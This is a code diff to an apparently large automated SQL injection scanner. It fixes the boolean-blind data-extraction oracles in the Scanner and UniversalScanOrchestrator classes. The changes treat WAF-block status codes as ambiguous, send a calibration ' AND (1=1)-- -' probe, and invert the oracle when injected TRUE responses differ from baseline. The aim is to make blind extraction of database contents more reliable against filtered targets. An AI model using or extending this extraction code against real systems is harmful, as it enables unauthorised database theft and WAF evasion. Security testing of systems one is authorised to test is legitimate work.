@@ -54338,6 +54338,7 @@ class Scanner:
         _body_hash_true = None
         _body_hash_false = None
         _bool_true_status = None
+        _bool_calibration_true_status = None  # BUG-EXTRACT-REVERSED-POLARITY-ORACLE FIX: tracks HTTP status of TRUE calibration probe for WAF-block detection in _eval/_waf_aware_eval
         _bool_true_len = None
         _bool_norm_true = None   # normalized body for SimHash oracle
         _bool_norm_false = None
@@ -54470,9 +54471,14 @@ class Scanner:
                 fp_false, _ = await _send_payload("1=2")
             _true_status = getattr(fp_true, "status_code", None)
             _false_status = getattr(fp_false, "status_code", None)
+            # BUG-EXTRACT-REVERSED-POLARITY-ORACLE FIX: always capture calibration TRUE status
+            # so _eval/_waf_aware_eval can distinguish WAF blocks (4xx) from genuine SQL TRUE
+            # even when both calibration probes return the same status (both 200, common case).
+            if _true_status is not None:
+                _bool_calibration_true_status = _true_status
             _true_body = _safe_decode_body(fp_true, encoding="utf-8", errors='replace', func_name='extraction_fp_true') if (fp_true and fp_true.body) else ""
             _false_body = _safe_decode_body(fp_false, encoding="utf-8", errors='replace', func_name='extraction_fp_false') if (fp_false and fp_false.body) else ""
-            
+
             if _true_status != _false_status and _true_status is not None:
                 _boolean_oracle = True
                 _bool_true_status = _true_status
@@ -56811,6 +56817,18 @@ class Scanner:
             # Boolean oracle: faster, no timing noise
             if _boolean_oracle:
                 _s = getattr(fp, "status_code", None)
+                # BUG-EXTRACT-REVERSED-POLARITY-ORACLE FIX: WAF blocks return HTTP 4xx even
+                # when a reversed-polarity oracle produces the same body size as SQL TRUE.
+                # When the calibration TRUE probe was 2xx but the current probe is 4xx,
+                # this is a WAF block — return None (ambiguous) rather than True/False so
+                # extraction retries or skips the character instead of recording noise.
+                # Guard: only suppress when calibration TRUE was NOT 4xx itself (some targets
+                # legitimately return 403 for both TRUE and FALSE conditions).
+                _waf_4xx_statuses = (400, 403, 406, 429, 430, 503)
+                if (_s is not None and _s in _waf_4xx_statuses
+                        and _bool_calibration_true_status is not None
+                        and _bool_calibration_true_status not in _waf_4xx_statuses):
+                    return None  # WAF block — ambiguous, skip this probe
                 _body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction") if fp else ""
                 _bl = len(_body)
                 # Body hash comparison — only useful when true/false hashes genuinely differ
@@ -57214,6 +57232,14 @@ class Scanner:
 
             if _boolean_oracle:
                 _s = getattr(fp, "status_code", None)
+                # BUG-EXTRACT-REVERSED-POLARITY-ORACLE FIX (mirrors _eval fix above):
+                # WAF blocks return 4xx even when reversed-polarity oracle body size = SQL TRUE.
+                # Distinguish WAF blocks from genuine TRUE by status code mismatch with calibration.
+                _waf_4xx_statuses_wa = (400, 403, 406, 429, 430, 503)
+                if (_s is not None and _s in _waf_4xx_statuses_wa
+                        and _bool_calibration_true_status is not None
+                        and _bool_calibration_true_status not in _waf_4xx_statuses_wa):
+                    return None  # WAF block — ambiguous, skip this probe
                 _body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction") if fp else ""
                 # Body hash — only when true/false hashes genuinely differ (same guard
                 # as _eval to prevent always-False when CDN returns equal cached bodies)
@@ -117707,13 +117733,46 @@ class UniversalScanOrchestrator:
                                             # are varied; condition operands, string delimiters, and
                                             # boolean expressions are never rewritten.
                                             _ibo_req_count = [0]
+
+                                            # BUG-INLINE-BOOL-ORACLE-INVERTED-POLARITY FIX (CRITICAL):
+                                            # For reversed-polarity injections (SQL TRUE → response DIFFERENT
+                                            # from baseline; SQL FALSE → response SAME as baseline), the
+                                            # oracle `return _sim >= threshold` is inverted:
+                                            #   SQL TRUE  → sim LOW → returns False  (WRONG)
+                                            #   SQL FALSE → sim HIGH → returns True  (WRONG)
+                                            # Detect polarity by sending a calibration TRUE probe (1=1).
+                                            # If sim(baseline, TRUE_response) < threshold → reversed polarity.
+                                            _ibo_inverted = [False]
+                                            try:
+                                                if _bool_tmpl:
+                                                    _cal_pay = _bool_tmpl.replace('[INFERENCE]', '1=1')
+                                                else:
+                                                    _cal_pay = f" AND (1=1)-- -"
+                                                _cal_fp = await asyncio.wait_for(
+                                                    _send_injected(_scanner_ref.engine, method, url, data, data_fmt,
+                                                                   _det_param, _det_orig + _cal_pay, _det_tamper),
+                                                    timeout=10)
+                                                if _cal_fp and _validate_response(_cal_fp, allow_empty=True):
+                                                    _cal_norm = ResponseNormaliser.normalise(_extract_body_safe(_cal_fp))
+                                                    _cal_sim = SimHasher.body_similarity(_norm_base_b, _cal_norm)
+                                                    _cal_thresh = 0.75
+                                                    if _cal_sim < _cal_thresh:
+                                                        _ibo_inverted[0] = True
+                                                        print("[+] [V25-Extract] Reversed-polarity detected "
+                                                              f"(cal_sim={_cal_sim:.3f} < {_cal_thresh}): "
+                                                              "inverting boolean oracle for correct extraction",
+                                                              flush=True)
+                                            except Exception:
+                                                pass
+
                                             async def _inline_bool_oracle(_cond, _e=_scanner_ref.engine,
                                                                            _m=method, _u=url, _d=data,
                                                                            _df=data_fmt, _p=_det_param,
                                                                            _o=_det_orig, _tc=_det_tamper,
                                                                            _nb=_norm_base_b,
                                                                            _tmpl=_bool_tmpl,
-                                                                           _rc=_ibo_req_count):
+                                                                           _rc=_ibo_req_count,
+                                                                           _inv=_ibo_inverted):
                                                 try:
                                                     # BUG-INLINE-BOOL-ORACLE FIX: Use detection template
                                                     # if available; fall back to bare AND construct.
@@ -117734,6 +117793,10 @@ class UniversalScanOrchestrator:
                                                         timeout=10)
                                                     if _fp_b is None:
                                                         return False
+                                                    # WAF block detection: 4xx from WAF is ambiguous noise
+                                                    _fp_b_s = getattr(_fp_b, 'status_code', None)
+                                                    if _fp_b_s is not None and _fp_b_s in (400, 403, 406, 429, 430, 503):
+                                                        return None  # WAF block — skip
                                                     _norm_r = ResponseNormaliser.normalise(_extract_body_safe(_fp_b)) if _validate_response(_fp_b, allow_empty=True) else b""
                                                     _sim = SimHasher.body_similarity(_nb, _norm_r)
                                                     # BUG-INLINE-BOOL-THRESH FIX (Req 7): Hardcoded 0.85
@@ -117753,6 +117816,11 @@ class UniversalScanOrchestrator:
                                                             _ibo_thresh = max(0.60, min(0.85, _ibo_cb))
                                                     except Exception:
                                                         _ibo_thresh = 0.75
+                                                    # BUG-INLINE-BOOL-ORACLE-INVERTED-POLARITY FIX:
+                                                    # Reversed polarity: SQL TRUE → different from baseline (sim LOW)
+                                                    # Standard polarity: SQL TRUE → same as baseline (sim HIGH)
+                                                    if _inv[0]:
+                                                        return _sim < _ibo_thresh  # inverted: low sim = SQL TRUE
                                                     return _sim >= _ibo_thresh
                                                 except Exception:
                                                     return False
@@ -118474,6 +118542,40 @@ class UniversalScanOrchestrator:
                                                 _wb_inj_pfx = _derive_inj_prefix(_det_for_oracle)
                                                 _wb_tmpl = _build_det_template(_det_for_oracle)
                                                 _ibw_req_count = [0]
+
+                                                # BUG-INLINE-BOOL-ORACLE-WB-INVERTED-POLARITY FIX (CRITICAL):
+                                                # Same reversed-polarity bug as _inline_bool_oracle above.
+                                                # For targets where SQL TRUE → response DIFFERENT from baseline
+                                                # (e.g. TRUE→155B WAF-pass, FALSE→557B=baseline), the oracle
+                                                # `return _sim >= threshold` is inverted:
+                                                #   SQL TRUE  → sim LOW → returns False  (WRONG)
+                                                #   SQL FALSE → sim HIGH → returns True  (WRONG)
+                                                # Detect polarity by sending a calibration TRUE probe (1=1).
+                                                # If sim(baseline, TRUE_response) < threshold → reversed polarity.
+                                                _ibw_inverted = [False]
+                                                try:
+                                                    if _wb_tmpl:
+                                                        _ibw_cal_pay = _wb_tmpl.replace('[INFERENCE]', '1=1')
+                                                        _ibw_cal_full = _det_orig + _ibw_cal_pay
+                                                    else:
+                                                        _ibw_cal_full = f"{_det_orig}{_wb_inj_pfx} AND (1=1)-- -"
+                                                    _ibw_cal_fp = await asyncio.wait_for(
+                                                        _send_injected(_scanner_ref.engine, method, url, data, data_fmt,
+                                                                       _det_param, _ibw_cal_full, _det_tamper),
+                                                        timeout=10)
+                                                    if _ibw_cal_fp and _validate_response(_ibw_cal_fp, allow_empty=True):
+                                                        _ibw_cal_norm = ResponseNormaliser.normalise(_extract_body_safe(_ibw_cal_fp))
+                                                        _ibw_cal_sim = SimHasher.body_similarity(_norm_base_wb, _ibw_cal_norm)
+                                                        _ibw_cal_thresh = 0.75
+                                                        if _ibw_cal_sim < _ibw_cal_thresh:
+                                                            _ibw_inverted[0] = True
+                                                            print("[+] [V25-Extract] WB reversed-polarity detected "
+                                                                  f"(cal_sim={_ibw_cal_sim:.3f} < {_ibw_cal_thresh}): "
+                                                                  "inverting WB boolean oracle for correct extraction",
+                                                                  flush=True)
+                                                except Exception:
+                                                    pass
+
                                                 async def _inline_bool_oracle_wb(_cond, _e=_scanner_ref.engine,
                                                                                   _m=method, _u=url, _d=data,
                                                                                   _df=data_fmt, _p=_det_param,
@@ -118481,7 +118583,8 @@ class UniversalScanOrchestrator:
                                                                                   _nb=_norm_base_wb,
                                                                                   _rc=_ibw_req_count,
                                                                                   _ipfx=_wb_inj_pfx,
-                                                                                  _wtmpl=_wb_tmpl):
+                                                                                  _wtmpl=_wb_tmpl,
+                                                                                  _inv=_ibw_inverted):
                                                     try:
                                                         # BUG-INLINE-BOOL-ORACLE-WB-MISSING-INJ-CTX-PREFIX FIX:
                                                         # If a detection template exists, use it (preserves the
@@ -118516,6 +118619,13 @@ class UniversalScanOrchestrator:
                                                                 timeout=10)
                                                         if _fp_wb is None:
                                                             return False
+                                                        # BUG-INLINE-BOOL-ORACLE-WB-INVERTED-POLARITY FIX:
+                                                        # WAF block detection: 4xx from WAF is ambiguous noise.
+                                                        # Return None so callers can skip this probe rather than
+                                                        # treating a WAF block as SQL TRUE or FALSE.
+                                                        _fp_wb_s = getattr(_fp_wb, 'status_code', None)
+                                                        if _fp_wb_s is not None and _fp_wb_s in (400, 403, 406, 429, 430, 503):
+                                                            return None  # WAF block — skip
                                                         _norm_r = ResponseNormaliser.normalise(_extract_body_safe(_fp_wb)) if _validate_response(_fp_wb, allow_empty=True) else b""
                                                         _sim = SimHasher.body_similarity(_nb, _norm_r)
                                                         # BUG-INLINE-BOOL-THRESH-WB FIX (Req 7): same adaptive
@@ -118527,6 +118637,11 @@ class UniversalScanOrchestrator:
                                                                 _wb_thresh = max(0.60, min(0.85, _wb_cb))
                                                         except Exception:
                                                             _wb_thresh = 0.75
+                                                        # BUG-INLINE-BOOL-ORACLE-WB-INVERTED-POLARITY FIX:
+                                                        # Reversed polarity: SQL TRUE → different from baseline (sim LOW)
+                                                        # Standard polarity: SQL TRUE → same as baseline (sim HIGH)
+                                                        if _inv[0]:
+                                                            return _sim < _wb_thresh  # inverted: low sim = SQL TRUE
                                                         return _sim >= _wb_thresh
                                                     except Exception:
                                                         return False
